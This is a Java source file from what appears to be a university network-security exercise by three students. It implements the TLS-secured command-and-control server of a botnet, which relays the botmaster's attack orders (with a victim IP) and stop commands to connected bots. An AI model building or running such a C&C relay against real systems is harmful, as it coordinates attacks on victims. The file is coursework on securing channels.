/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 1
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με χρήση IPsec & TLS/SSL πρωτοκόλλων.
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import javax.net.ssl.HandshakeCompletedEvent;
import javax.net.ssl.HandshakeCompletedListener;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;
import javax.swing.JTextArea;

/**
 *
 * Class pou edrewnw tin epikoinwnia tou C&C me ton BotMaster (start & stop)
 * kathos k dimiourgia tou chat anametaksi tous.
 */
public class ChatWithBotMaster implements Serializable{
    private int port; //Port pou sindeete o C&C me ton BotMaster.
    private SSLServerSocket Ssocket;
    private SSLSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private JTextArea Text;
    private Chat chating = new Chat();
    private KeyManagerFactory serverKeyManager;
    private TrustManagerFactory trustManager;
    private ArrayList<ObjectOutputStream> Bots = new ArrayList(); //exun k OOS k socket.
    
    //An thelei o admin tu C&C borei na allaksei to port me ton BotMaster.
    public ChatWithBotMaster(int port, JTextArea Text) {
        this.port = port;
        this.Text = Text;
    }
    
    //Default times gia to port me ton BotMaster
    public ChatWithBotMaster(){
        port = 5555;
    }
    
    /**
     * Methodos pou arhizw to Connection me ton BotMaster
     * Dedomenou pws mono enas xristis borei na einai BotMaster kathe fora
     * den xrisimopoiw MultiThread Server gia tin epikoinwnia tou
     * C&C Server me ton BotMaster.
     */
    public void Start_Connection(){
        try {
            Text.append("Server waiting for BotMaster..." + "\n");
//            System.setProperty("javax.net.debug", "ssl:record");
            Certificates ca = new Certificates("Server");
            TrustManagerFactory trustManager = ca.FindCaKey();
            KeyManagerFactory serverKeyManager = ca.FindPubKey();
            CreateSSLsock(serverKeyManager, trustManager);
//            System.out.println("Server waiting for BotMaster on port "+ port +"...");
            
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
            Chat_Thread.start();
        } catch (NullPointerException | IOException ex) {
            Stop_Connection();
        }
    }
    
    
    /**
     * Methodos gia na stamatisume tin sindesi tou BotMaster me ton C&C Server.
     * O C&C den kleinei perimenei mexri na ksanasindethei o BotMaster i mexri 
     * na termatisei o admin tou C&C ton C&C.
     */
    public void Stop_Connection(){
        keepWalking = false;
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {

        }
        try {
            if(socket !=null) socket.close();
            if(Ssocket !=null) Ssocket.close();
        } catch (IOException ex) {
            return;
        }
//        System.out.println("keep: "+keepWalking);
    }
    
    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou BotMaster kai tou
     * C&C Server.
     */
    private Thread Chat_Thread = new Thread(() -> {
        chating = new Chat(oos, ois, "BotMaster");
        chating.SendMessage(msgs.WelcomeMaster());
        Text.append(msgs.SendAsServer() + msgs.WelcomeMaster() + "\n");
        while(keepWalking == true){
            Object readObj = chating.readMessage();
            if(!(readObj.equals(""))){
                Text.append(msgs.SendAsBotMaster() + readObj.toString() + "\n");
            }
            

            if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){ //Kleinw to connection me ton BotMaster.
                /**
                * O BotMaster thelei na stamatisei to connection me ton C&C.
                * Auto omws den simainei pws tha kanume Stop k to attack
                * an ehei dwsei prin apo auto entoli gia attack.
                */
                chating.SendMessage(msgs.ByeMaster());
                Text.append(msgs.SendAsServer() + msgs.ByeMaster() + "\n");
                chating.SendMessage(msgs.StopConnection());
                Text.append(msgs.SendAsServer() + msgs.StopConnection() + "\n");
                Stop_Connection();
                //System.out.println(keepWalking);
            }
            else if(readObj.toString().equalsIgnoreCase(msgs.StopAttack())){ //Stamataw tin epithesi sto Victim.
                /**
                * Dinei entoli gia na stamatisei i attack. Den simainei pws kanei
                * logout apo ton server. Sinehizei na einai syndedemenos sto 
                * C&C server.
                */
                Text.append("Retreat my Bots ...\n");
                for(int i=0; i<Bots.size(); i++){
//                    System.out.println("oos gia attack: " + Bots.get(i));
                    chating.SendMessageWithOOS(msgs.StopAttack(), Bots.get(i));
//                    System.out.println("attack");
                }
            }
            else if(readObj instanceof Attack_Properties){
                Attack_Properties ap = new Attack_Properties();
                ap = (Attack_Properties) readObj;
//                System.out.println("attacking ip : " + ap.getIP_Victim() + "\nsize: " + Bots.size());
                for(int i=0; i<Bots.size(); i++){
//                    System.out.println("oos gia attack: " + Bots.get(i));
                    chating.SendMessageWithOOS(ap, Bots.get(i));
                    //System.out.println("attack");
                }
                Text.append("Bots Chargeeee !!!\n");
            }
            
//            System.out.println("BotMater> " + readObj.toString());

        }
    });
    
    private void CreateSSLsock(KeyManagerFactory serverKeyManager,  TrustManagerFactory trustManager){
        try {
            //use keys to create SSLSoket
            SSLContext ssl = SSLContext.getInstance("TLS");
            ssl.init(serverKeyManager.getKeyManagers(), trustManager.getTrustManagers(), SecureRandom.getInstance("SHA1PRNG"));
            Ssocket = (SSLServerSocket)ssl.getServerSocketFactory().createServerSocket(port);
            Ssocket.setNeedClientAuth(true);
            socket = (SSLSocket)Ssocket.accept();
            socket.addHandshakeCompletedListener(new MyHandshakeListener());
        } catch (NoSuchAlgorithmException | IOException | KeyManagementException ex) {
            Stop_Connection();
        }
    }
    
    //GETS:
    public int getPort() {
        return port;
    }

    public ServerSocket getSsocket() {
        return Ssocket;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public Socket getSocket() {
        return socket;
    }

    public boolean keepWalking() {
        return keepWalking;
    }
    
    
    
    
    //SETS:
    public void setPort(int port) {
        this.port = port;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public void keepWalking(boolean keepWalking) {
        this.keepWalking = keepWalking;
    }

    public void setBots(ArrayList<ObjectOutputStream> Bots) {
        this.Bots = Bots;
    }
    

    public void sendBotList(ArrayList<Bot_Properties> botList) {

        for(int i=0; i<botList.size(); i++){
            System.out.println(botList.get(i).getBotPCname());
            System.out.println(botList.get(i).getBotIP());
        }
        if(!botList.isEmpty()){
            System.out.println("Stelnw lista." + botList);
            chating.SendMessage(botList);
        }
    }
    
   
}//End class

class MyHandshakeListener implements HandshakeCompletedListener {
    
   public void handshakeCompleted(HandshakeCompletedEvent e) {
     System.out.println("Handshake succesful! from " + e.getSocket());
     System.out.println("Using cipher suite: " + e.getCipherSuite());
   }
}
